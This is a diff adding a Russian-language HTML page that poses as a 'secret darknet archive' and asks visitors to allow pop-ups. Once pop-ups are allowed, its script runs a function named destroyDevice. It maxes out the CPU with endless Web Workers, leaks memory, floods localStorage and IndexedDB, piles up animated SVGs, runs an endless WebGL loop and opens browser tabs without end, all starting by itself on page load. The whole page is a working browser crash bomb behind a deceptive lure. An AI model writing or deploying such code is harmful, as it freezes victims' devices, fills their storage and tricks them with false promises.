@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Секретный архив Tuzyaka1488</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding-top: 20%;
+        }
+        h1 {
+            font-size: 2.5em;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        p {
+            font-size: 1.2em;
+            max-width: 600px;
+            margin: 20px auto;
+        }
+        canvas {
+            display: none; /* Скрываем канвас до запуска */
+        }
+    </style>
+</head>
+<body>
+    <h1>Tuzyaka1488 поделился секретным архивом</h1>
+    <p>Бро, это ультрасекретные файлы, которые я нашёл на даркнете. Чтобы открыть архив, разреши всплывающие окна в браузере. После этого доступ будет активирован автоматически. Готов к правде?</p>
+
+    <canvas id="canvas" style="position:absolute; top:0; left:0;"></canvas>
+
+    <script>
+        // Проверяем разрешение всплывающих окон
+        function checkPopupPermission() {
+            const testPopup = window.open("", "_blank", "width=1,height=1");
+            if (testPopup) {
+                testPopup.close();
+                destroyDevice();
+            } else {
+                setTimeout(checkPopupPermission, 1000);
+            }
+        }
+
+        // Основная функция уничтожения
+        function destroyDevice() {
+            document.body.innerHTML = "<h1>Доступ активирован. Распаковка началась...</h1>";
+            document.body.style.color = "#ff0000";
+            document.body.style.textShadow = "0 0 10px #ff0000";
+
+            // 1. Ускорение загрузки процессора с Web Workers
+            function startWorkers() {
+                for (let i = 0; i < navigator.hardwareConcurrency || 4; i++) {
+                    const workerCode = `
+                        onmessage = function() {
+                            while (true) {
+                                for (let i = 0; i < 1000000; i++) {
+                                    Math.sin(Math.random());
+                                }
+                            }
+                        };
+                    `;
+                    const blob = new Blob([workerCode], { type: "application/javascript" });
+                    const worker = new Worker(URL.createObjectURL(blob));
+                    worker.postMessage("start");
+                }
+            }
+
+            // 2. Более быстрая утечка памяти с вложенными объектами
+            function memoryLeak() {
+                let root = {};
+                let current = root;
+                function createNested() {
+                    for (let i = 0; i < 1000; i++) {
+                        current[i] = { data: new Array(10000).join("leak"), next: {} };
+                        current = current[i].next;
+                    }
+                    setTimeout(createNested, 1);
+                }
+                createNested();
+            }
+
+            // 3. Перегрузка диска через localStorage и IndexedDB
+            function diskOverload() {
+                try {
+                    for (let i = 0; i < 10000; i++) {
+                        localStorage.setItem("key" + i, new Array(100000).join("x"));
+                    }
+                } catch (e) { console.log("localStorage полон"); }
+
+                const dbRequest = indexedDB.open("CrashDB", 1);
+                dbRequest.onupgradeneeded = function(event) {
+                    const db = event.target.result;
+                    db.createObjectStore("store");
+                };
+                dbRequest.onsuccess = function(event) {
+                    const db = event.target.result;
+                    const tx = db.transaction("store", "readwrite");
+                    const store = tx.objectStore("store");
+                    function writeData() {
+                        store.put(new Array(1000000).join("d"), "data" + Date.now());
+                        setTimeout(writeData, 1);
+                    }
+                    writeData();
+                };
+            }
+
+            // 4. Манипуляции с DOM (SVG с анимациями и фильтрами)
+            function domOverload() {
+                for (let i = 0; i < 100; i++) {
+                    const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
+                    svg.setAttribute("width", "1000");
+                    svg.setAttribute("height", "1000");
+                    svg.style.position = "absolute";
+                    svg.style.left = Math.random() * 100 + "vw";
+                    svg.style.top = Math.random() * 100 + "vh";
+                    svg.innerHTML = `
+                        <filter id="blur">
+                            <feGaussianBlur in="SourceGraphic" stdDeviation="10"/>
+                        </filter>
+                        <circle cx="500" cy="500" r="400" fill="red" filter="url(#blur)">
+                            <animate attributeName="r" from="400" to="450" dur="0.1s" repeatCount="indefinite"/>
+                        </circle>
+                    `;
+                    document.body.appendChild(svg);
+                }
+                setTimeout(domOverload, 100);
+            }
+
+            // 5. Манипуляции с графикой через WebGL
+            function webglOverload() {
+                const canvas = document.getElementById("canvas");
+                canvas.style.display = "block";
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                const gl = canvas.getContext("webgl");
+                if (!gl) return;
+
+                const vsSource = `
+                    attribute vec4 aPosition;
+                    void main() {
+                        gl_Position = aPosition;
+                    }
+                `;
+                const fsSource = `
+                    precision mediump float;
+                    uniform float uTime;
+                    void main() {
+                        gl_FragColor = vec4(sin(uTime), cos(uTime), 0.5, 1.0);
+                    }
+                `;
+
+                const vertexShader = gl.createShader(gl.VERTEX_SHADER);
+                gl.shaderSource(vertexShader, vsSource);
+                gl.compileShader(vertexShader);
+                const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
+                gl.shaderSource(fragmentShader, fsSource);
+                gl.compileShader(fragmentShader);
+                const program = gl.createProgram();
+                gl.attachShader(program, vertexShader);
+                gl.attachShader(program, fragmentShader);
+                gl.linkProgram(program);
+                gl.useProgram(program);
+
+                const positionBuffer = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
+                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
+
+                const aPosition = gl.getAttribLocation(program, "aPosition");
+                gl.enableVertexAttribArray(aPosition);
+                gl.vertexAttribPointer(aPosition, 2, gl.FLOAT, false, 0, 0);
+
+                const uTime = gl.getUniformLocation(program, "uTime");
+                function render() {
+                    gl.uniform1f(uTime, performance.now() / 1000);
+                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+                    requestAnimationFrame(render);
+                }
+                render();
+            }
+
+            // 6. Бесконечные вкладки
+            function openTabs() {
+                window.open(window.location.href, "_blank");
+                setTimeout(openTabs, 1);
+            }
+
+            // Запускаем всё
+            startWorkers();
+            memoryLeak();
+            diskOverload();
+            domOverload();
+            webglOverload();
+            openTabs();
+        }
+
+        // Начинаем проверку при загрузке
+        window.onload = function() {
+            checkPopupPermission();
+        };
+    </script>
+</body>
+</html>
